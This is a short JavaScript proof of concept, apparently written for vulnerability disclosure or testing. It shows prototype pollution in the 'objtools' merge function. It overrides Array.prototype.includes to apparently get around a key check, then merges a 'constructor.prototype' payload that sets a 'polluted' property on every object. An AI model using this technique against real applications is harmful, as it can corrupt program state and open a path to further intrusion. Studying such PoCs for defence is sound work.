Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
const objtools = require('objtools');
const payload = JSON.parse('{"constructor.prototype": {"polluted":"yes"}}');
obj = {};
console.log({}.polluted);
objtools.merge({}, payload);
console.log({}.polluted);